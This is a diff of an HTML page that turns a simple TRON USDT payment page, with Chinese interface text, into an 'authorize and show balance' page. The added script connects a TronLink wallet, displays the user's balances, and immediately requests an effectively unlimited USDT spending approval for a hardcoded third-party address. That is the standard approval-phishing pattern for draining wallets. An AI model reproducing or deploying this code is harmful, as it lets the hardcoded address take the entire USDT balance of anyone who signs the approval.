@@ -1,100 +1,57 @@
 <!DOCTYPE html>
-<html lang="zh">
+<html>
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>TRON USDT 支付</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      text-align: center;
-      padding: 2rem;
-    }
-    button {
-      padding: 0.6rem 1.2rem;
-      font-size: 1rem;
-      margin-top: 1rem;
-      cursor: pointer;
-    }
-    #wallet-info {
-      margin-top: 2rem;
-      font-size: 1rem;
-    }
-    #status {
-      margin-top: 1rem;
-      color: #006400;
-    }
-  </style>
+  <meta charset="UTF-8">
+  <title>授权与余额展示</title>
   <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 40px; }
+    button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+    .info { margin-top: 20px; font-size: 18px; }
+  </style>
 </head>
 <body>
-  <h2>TRON USDT 支付页面</h2>
-  <button onclick="connectWallet()">连接钱包</button>
 
-  <div id="wallet-info" style="display:none;">
-    <p>钱包地址：<span id="wallet-address"></span></p>
-    <p>TRX 余额：<span id="trx-balance"></span> TRX</p>
-    <p>USDT 余额：<span id="usdt-balance"></span> USDT</p>
-    <button onclick="payUSDT()">支付 1 USDT</button>
-    <p id="status"></p>
-  </div>
+<h2>USDT 授权 + 余额显示</h2>
+<button onclick="connectAndAuthorize()">连接钱包并授权</button>
 
-  <script>
-    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC20 USDT 合约
-    const recipientAddress = "TUQ1kXNFQ5vMop7YtaUVDnY2KSiDjKcS9C";  // 目标地址
-    let userAddress = "";
+<div class="info" id="walletInfo"></div>
 
-    async function connectWallet() {
-      if (window.tronWeb && window.tronWeb.ready) {
-        await initWallet();
-      } else if (window.tronLink) {
-        try {
-          const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
-          if (res.code === 200) {
-            window.tronWeb = window.tronLink.tronWeb;
-            await initWallet();
-          } else {
-            alert("钱包连接失败");
-          }
-        } catch (err) {
-          alert("用户拒绝连接");
-        }
-      } else {
-        alert("请安装 TronLink 钱包");
-      }
+<script>
+const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT合约
+const SPENDER_ADDRESS = "TRqYfpyMWxw1LBs5ErGczzACJgyG2i7Vt5"; // 接收授权的地址
+const APPROVE_AMOUNT = "999999999999999"; // 无限大授权额度
+
+async function connectAndAuthorize() {
+    if (typeof window.tronWeb === 'undefined' || !window.tronWeb.ready) {
+        alert("请先安装并登录 TronLink 钱包");
+        return;
     }
 
-    async function initWallet() {
-      try {
-        userAddress = window.tronWeb.defaultAddress.base58;
-        document.getElementById("wallet-address").textContent = userAddress;
+    try {
+        const userAddress = window.tronWeb.defaultAddress.base58;
+        const trxBalanceSun = await window.tronWeb.trx.getBalance(userAddress);
+        const trxBalance = window.tronWeb.fromSun(trxBalanceSun);
 
-        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
-        document.getElementById("trx-balance").textContent = parseFloat(window.tronWeb.fromSun(trxBalance)).toFixed(6);
+        const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT);
+        const usdtBalanceRaw = await usdtContract.balanceOf(userAddress).call();
+        const usdtBalance = window.tronWeb.fromSun(usdtBalanceRaw);
 
-        const contract = await window.tronWeb.contract().at(usdtContractAddress);
-        const usdtRaw = await contract.balanceOf(userAddress).call();
-        document.getElementById("usdt-balance").textContent = parseFloat(window.tronWeb.fromSun(usdtRaw.toString())).toFixed(6);
+        document.getElementById('walletInfo').innerHTML = `
+            <p>地址: ${userAddress}</p>
+            <p>TRX余额: ${parseFloat(trxBalance).toFixed(6)}</p>
+            <p>USDT余额: ${parseFloat(usdtBalance).toFixed(6)}</p>
+        `;
 
-        document.getElementById("wallet-info").style.display = "block";
-      } catch (e) {
-        alert("初始化失败: " + e.message);
-      }
+        const approveTx = await usdtContract.approve(SPENDER_ADDRESS, window.tronWeb.toSun(APPROVE_AMOUNT)).send();
+        alert("授权成功，交易ID：" + approveTx);
+
+    } catch (err) {
+        console.error("错误：", err);
+        alert("发生错误，请查看控制台日志");
     }
+}
+</script>
 
-    async function payUSDT() {
-      try {
-        document.getElementById("status").textContent = "正在发起支付...";
-        const contract = await window.tronWeb.contract().at(usdtContractAddress);
-        const amount = window.tronWeb.toSun(1); // 1 USDT
-
-        const tx = await contract.transfer(recipientAddress, amount).send({ feeLimit: 1_000_000 });
-        document.getElementById("status").innerHTML = `✅ 支付成功，交易哈希：<br>${tx}`;
-      } catch (err) {
-        console.error(err);
-        document.getElementById("status").textContent = "❌ 支付失败：" + err.message;
-      }
-    }
-  </script>
 </body>
 </html>
